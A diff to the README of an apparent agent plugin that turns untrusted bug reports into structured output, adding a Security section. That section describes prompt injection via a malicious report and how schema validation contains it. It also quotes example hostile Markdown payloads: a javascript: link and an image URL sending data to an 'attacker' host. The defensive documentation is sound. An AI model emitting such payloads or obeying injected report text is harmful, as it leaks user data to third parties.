@@ -57,7 +57,7 @@ The agent calls `improve_bug_report` with:
 | Parameter   | Type   | Required | Default      | Description                                                            |
 |-------------|--------|----------|--------------|------------------------------------------------------------------------|
 | `raw_text`  | string | yes      | —            | The original, unstructured bug report text (max 16 KB).                |
-| `context`   | string | no       | `""`         | Extra environment/context info (versions, OS, browser, build number).  |
+| `context`   | string | no       | `""`         | Extra environment/context info (versions, OS, browser, build number; max 4 KB). |
 | `format`    | string | no       | `"markdown"` | `"markdown"` for humans, `"json"` for downstream tooling.              |
 
 ### As a slash command
@@ -127,12 +127,40 @@ The rubric is fixed in v0.1.0 and is **not** user-configurable:
 - **Never invents facts.** Missing OS/version/steps/errors are listed under
   `missing_evidence`, not fabricated.
 - **Prefers `unknown` over guessing** when the input gives no signal about impact.
-- **Preserves verbatim** error messages, stack traces, and quoted strings.
+- **Preserves verbatim** error messages, stack traces, and quoted strings. The
+  `json` output keeps the exact text; the Markdown rendering normalizes whitespace
+  and escapes HTML for safety (see [Security](#security)), so prefer
+  `format: "json"` when exact bytes matter.
 - **One bug per call.** If the input mixes multiple bugs, the first is structured
   and the rest are flagged in `missing_evidence` to be filed separately.
 - **Never crashes the tool call.** All failures (invalid input, model error,
   `ctx.llm` unavailable, unparseable output after one retry) return a structured
   `{"error": "..."}` string.
+
+## Security
+
+The tool ingests an untrusted bug report and restructures it, so it treats the
+model's output as untrusted too:
+
+- **Prompt injection is contained, not prevented.** A malicious report can try to
+  steer the model, but the output is constrained to a fixed JSON schema
+  (`additionalProperties: false`) and then re-validated by the handler (severity is
+  allow-listed, fields are type-checked, the title is length-capped). Injection
+  cannot change the report's shape or add fields — only the free-text values.
+- **Markdown output is sanitized.** Rendered fields have control characters
+  removed (including ESC, preventing ANSI escape injection in a terminal),
+  whitespace collapsed (preventing forged headings/lists), and `& < >` HTML-escaped
+  (preventing raw-HTML/XSS in an HTML renderer).
+- **Render Markdown safely downstream.** Markdown link/image syntax
+  (`[…](javascript:…)`, `![](http://attacker/?leak)`) cannot be neutralized at the
+  source without mangling legitimate text. Consumers that render this Markdown as
+  HTML should use a sanitizing renderer (disallow raw HTML, restrict URL schemes,
+  do not auto-load remote images). `format: "json"` returns exact text (structural
+  escaping only) and leaves display escaping to the consumer.
+- **Input is bounded.** `raw_text` is capped at 16 KB and `context` at 4 KB.
+- **No secrets, no egress.** The plugin stores no API keys and makes no network
+  calls of its own; it uses the agent's model via `ctx.llm`. Unexpected errors
+  return a generic message and are logged rather than reflected to the caller.
 
 ## Configuration notes
 
